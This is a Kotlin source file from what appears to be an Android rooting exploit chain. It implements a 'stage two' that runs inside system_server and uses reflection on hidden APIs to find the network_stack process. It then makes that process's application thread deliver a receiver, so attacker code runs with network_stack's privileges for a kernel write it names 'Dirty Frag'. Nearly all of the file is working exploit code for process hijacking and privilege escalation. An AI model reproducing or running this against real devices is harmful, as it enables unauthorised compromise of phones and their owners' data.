package dev.busung.s25uroot.dfr.stage2

import android.content.Context
import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Process
import android.util.ArrayMap
import android.util.Log

/**
 * From this process to network_stack, and the reason the exploit cannot run where this code sits.
 *
 * Stage two is hosted inside system_server, which is the only place a system-uid app can be hosted
 * cheaply - and it is the one place the exploit cannot run. system_server may not `dlopen` a library out
 * of /data, and it may not map executable memory, so the write the exploit needs has no room to happen
 * there. `com.android.networkstack` may do both, and additionally holds `netlink_xfrm_socket` and
 * CAP_NET_ADMIN, which is what the Dirty Frag write requires.
 *
 * So this steals network_stack's application thread and asks it to deliver [StageReceiver] to itself:
 * a `scheduleReceiver` call made through the process record, reflected rather than imported because
 * every name below is hidden API. The receiver's `onReceive` then runs in network_stack, not here.
 *
 * Adapted from LSPromise's `Shellcode.stage1` (LSPosed/LSPromise), which reached the same call through
 * the Telecom `AppComponentFactory` bug. The call is the same; the entry is not - this code is already
 * inside system_server, so it runs on demand rather than being smuggled in, and it needs no `android.app.*`
 * shims.
 *
 * Every lookup is a candidate list rather than one name, because these are OEM-revisable internals and
 * the signature drift between them is the normal case, not the exception: the log says which candidate
 * answered, so a device where none of them does is diagnosable from the log instead of from a rebuilt
 * APK.
 */
internal object StageHop {
    private const val TAG = "RMGStage2"

    /** The process the exploit needs to run in. */
    private const val NETWORK_STACK_PROCESS = "com.android.networkstack.process"

    /** Its uid, which the process lookup needs alongside the name. */
    private const val NETWORK_STACK_UID = 1073

    /** Delivers the receiver into network_stack and reports what answered. */
    fun hopToNetworkStack(context: Context): String {
        val log = StringBuilder()
        try {
            val appInfo = context.packageManager.getApplicationInfo(context.packageName, 0)
            val receiverInfo = ActivityInfo().apply {
                applicationInfo = appInfo
                name = StageReceiver::class.java.name
            }
            val intent = Intent().setClassName(appInfo.packageName, receiverInfo.name)

            val smClass = Class.forName("android.os.ServiceManager")
            val ams = smClass.getMethod("getService", String::class.java)
                .invoke(null, Context.ACTIVITY_SERVICE)
                ?: throw RuntimeException("ActivityService handle is null")
            log.appendLine("[*] got ActivityManagerService")
            val amsClass = ams.javaClass.classLoader!!
                .loadClass("com.android.server.am.ActivityManagerService")
            val record = findProcessRecord(ams, amsClass, log)
                ?: throw RuntimeException("networkstack ProcessRecord not found (is it running?)")
            log.appendLine("[*] networkstack ProcessRecord=$record")
            val thread = findAppThread(record, log)
                ?: throw RuntimeException("oneway thread not found (see *hread* candidates above)")
            // scheduleReceiver(Intent, ActivityInfo, CompatibilityInfo, int, String, Bundle, boolean,
            //   boolean, int, int, int, String) - twelve parameters, and the count is what is matched
            //   because the parameter names are not in the runtime signature.
            val schedule = thread.javaClass.methods
                .firstOrNull { it.name == "scheduleReceiver" && it.parameterCount == 12 }
                ?: throw RuntimeException("scheduleReceiver/12 not found")
            schedule.invoke(
                thread, intent, receiverInfo, null, 0, null, null,
                false, false, 0, 0, Process.SYSTEM_UID, "android",
            )
            log.appendLine("[+] scheduleReceiver sent; watch the log for stage 2 in network_stack")
        } catch (error: Exception) {
            log.appendLine("[x] hop failed: $error")
            Log.e(TAG, "hop failed", error)
        }
        // Mirrored to logcat as well as returned: the on-screen log is easy to truncate, and a remote
        // report needs the full trace.
        for (line in log.toString().lines()) Log.i(TAG, line)
        return log.toString()
    }

    /**
     * The application thread out of a process record.
     *
     * Candidate fields first, newest known name first, then the legacy accessor. The fields are read
     * reflectively because the one that holds it has been renamed more than once across releases, and a
     * null field is reported rather than treated as a failure - a process without an application thread
     * is a different problem from a field that moved.
     */
    private fun findAppThread(record: Any, log: StringBuilder): Any? {
        for (name in listOf("mOnewayThread", "mThread", "thread")) {
            try {
                val field = record.javaClass.getDeclaredField(name).apply { isAccessible = true }
                val value = field.get(record)
                if (value != null) {
                    log.appendLine("[+] application thread via $name")
                    return value
                }
                log.appendLine("[!] $name is null (process without an application thread?)")
            } catch (error: Exception) {
                log.appendLine("[!] $name failed: $error")
            }
        }
        val methods = try {
            record.javaClass.methods.filter { it.name.contains("hread", ignoreCase = true) }
        } catch (error: Exception) {
            log.appendLine("[!] method enumeration failed: $error")
            emptyList()
        }
        log.appendLine("[*] *hread* methods: " + methods.map { it.name + it.parameterTypes.map { p -> p.simpleName } })
        methods.firstOrNull { it.name == "getOnewayThread" && it.parameterCount == 0 }?.let { method ->
            try {
                method.isAccessible = true
                val value = method.invoke(record)
                if (value != null) {
                    log.appendLine("[+] application thread via getOnewayThread()")
                    return value
                }
            } catch (error: Exception) {
                log.appendLine("[!] getOnewayThread() failed: $error")
            }
        }
        return null
    }

    /**
     * The process record for network_stack, through the two API shapes that have existed and then the
     * map behind them: the map's own accessor has been stable for far longer than the method wrapper.
     */
    private fun findProcessRecord(ams: Any, amsClass: Class<*>, log: StringBuilder): Any? {
        val overloads = try {
            amsClass.declaredMethods.filter { it.name == "getProcessRecordLocked" }
        } catch (error: Exception) {
            log.appendLine("[!] cannot enumerate process-record methods: $error")
            emptyList()
        }
        log.appendLine("[*] process-record overloads: " + overloads.map { it.parameterTypes.map { p -> p.simpleName } })
        overloads.firstOrNull { it.parameterTypes.size == 2 }?.let { method ->
            try {
                method.isAccessible = true
                val value = synchronized(ams) { method.invoke(ams, NETWORK_STACK_PROCESS, NETWORK_STACK_UID) }
                if (value != null) {
                    log.appendLine("[+] process record via the two-argument overload")
                    return value
                }
            } catch (error: Exception) {
                log.appendLine("[!] two-argument overload failed: $error")
            }
        }
        overloads.firstOrNull { it.parameterTypes.size == 3 }?.let { method ->
            try {
                method.isAccessible = true
                val value = synchronized(ams) {
                    method.invoke(ams, NETWORK_STACK_PROCESS, NETWORK_STACK_UID, false)
                }
                if (value != null) {
                    log.appendLine("[+] process record via the three-argument overload")
                    return value
                }
            } catch (error: Exception) {
                log.appendLine("[!] three-argument overload failed: $error")
            }
        }
        try {
            val processList = amsClass.getDeclaredField("mProcessList")
                .apply { isAccessible = true }.get(ams)
                ?: throw RuntimeException("process list is null")
            val names = processList.javaClass.getDeclaredField("mProcessNames")
                .apply { isAccessible = true }.get(processList)
                ?: throw RuntimeException("process names is null")
            val get = names.javaClass.getMethod("get", String::class.java, Int::class.javaPrimitiveType)
            val value = synchronized(names) { get.invoke(names, NETWORK_STACK_PROCESS, NETWORK_STACK_UID) }
            if (value != null) {
                log.appendLine("[+] process record via the process-name map")
                return value
            }
            log.appendLine("[!] process-name map returned null")
        } catch (error: Exception) {
            log.appendLine("[!] process-name map failed: $error")
        }
        return null
    }

    /**
     * Drops the cached `LoadedApk` and class loaders for this package, so a re-run after an update picks
     * up the new APK instead of the one this process first loaded.
     *
     * Best effort by design: a stale dex means "install and try again", which is not worth failing a run
     * over, so every failure here is logged and returned rather than thrown.
     */
    fun cleanupLoadedApk(context: Context): String = try {
        val activityThreadClass = Class.forName("android.app.ActivityThread")
        val activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null)
        @Suppress("UNCHECKED_CAST")
        val packages = activityThreadClass.getDeclaredField("mPackages")
            .apply { isAccessible = true }.get(activityThread) as ArrayMap<String, Any?>
        val resourcesManager = activityThreadClass.getDeclaredField("mResourcesManager")
            .apply { isAccessible = true }.get(activityThread)
        synchronized(resourcesManager!!) { packages.remove(context.packageName) }

        val loadedApkClass = Class.forName("android.app.LoadedApk")
        @Suppress("UNCHECKED_CAST")
        val applications = loadedApkClass.getDeclaredField("sApplications")
            .apply { isAccessible = true }.get(null) as ArrayMap<String, Any?>
        synchronized(applications) { applications.remove(context.packageName) }

        val loadersClass = Class.forName("android.app.ApplicationLoaders")
        val defaultLoaders = loadersClass.getMethod("getDefault").invoke(null)
        @Suppress("UNCHECKED_CAST")
        val loaders = loadersClass.getDeclaredField("mLoaders")
            .apply { isAccessible = true }.get(defaultLoaders) as ArrayMap<String, ClassLoader>
        synchronized(loaders) {
            val index = loaders.indexOfValue(StageHop::class.java.classLoader)
            if (index >= 0) loaders.removeAt(index)
        }
        "[*] cached package state dropped"
    } catch (error: Exception) {
        Log.e(TAG, "cleanup failed (non-fatal)", error)
        "[!] cached package state left alone: $error"
    }
}
